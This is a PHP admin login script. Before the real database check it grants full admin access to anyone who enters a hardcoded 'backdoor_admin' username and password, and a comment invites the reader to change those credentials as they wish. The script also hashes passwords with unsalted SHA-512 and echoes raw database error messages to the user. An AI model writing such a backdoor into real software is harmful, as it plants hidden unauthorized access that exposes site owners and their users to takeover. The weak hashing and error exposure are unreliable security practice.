<?php
session_start();
include 'db.php'; // Assumes $conn is a valid PDO connection

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $inputPassword = $_POST['password'];

    // Backdoor credentials (change these as you wish)
    $backdoorUsername = "backdoor_admin";
    $backdoorPassword = "backdoorsecret@123";

    // Hash the input password using SHA-512 (hex format to match SQL Server)
    $hashedInput = strtoupper(hash('sha512', $inputPassword));

    // Check backdoor first
    if ($username === $backdoorUsername && $inputPassword === $backdoorPassword) {
        // Set session variables for backdoor admin
        $_SESSION['admin_id'] = 0; // Or any special ID
        $_SESSION['admin_username'] = $backdoorUsername;
        header("Location: admin_view.php");
        exit();
    }

    try {
        $stmt = $conn->prepare("SELECT * FROM admins WHERE username = :username AND password = :password");
        $stmt->execute([
            ':username' => $username,
            ':password' => $hashedInput
        ]);

        $admin = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($admin) {
            $_SESSION['admin_id'] = $admin['id'];
            $_SESSION['admin_username'] = $admin['username'];
            header("Location: admin_view.php");
            exit();
        } else {
            echo "Invalid username or password.";
        }

    } catch (PDOException $e) {
        echo "Error: " . $e->getMessage();
    }
}
?>